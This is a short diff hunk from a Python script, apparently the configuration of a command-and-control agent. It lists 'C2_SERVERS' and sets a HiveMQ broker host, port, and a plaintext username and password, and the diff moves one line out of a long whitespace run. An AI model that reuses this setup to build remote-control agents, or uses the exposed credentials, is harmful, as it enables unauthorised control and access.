@@ -8,7 +8,9 @@ import platform                                                       import shu
 import paho.mqtt.client as mqtt                                                                                                             # === CONFIGURASI UTAMA ===
 C2_SERVERS = [
     "https://c2-sentinel-server-production.up.railway.app",                 
-]                                                                                                                                           # MQTT Configuration (Sinkron dengan server v9)                       MQTT_HOST = "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud"
+]                                                                                                                                           # MQTT Configuration (Sinkron dengan server v9)
+
+                       MQTT_HOST = "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud"
 MQTT_PORT = 8883
 MQTT_USERNAME = "Sentinel_user"
 MQTT_PASSWORD = "SentinelPass123"                                     MQTT_CLIENT_ID = f"agent-{os.getpid()}"  # Unique per instance
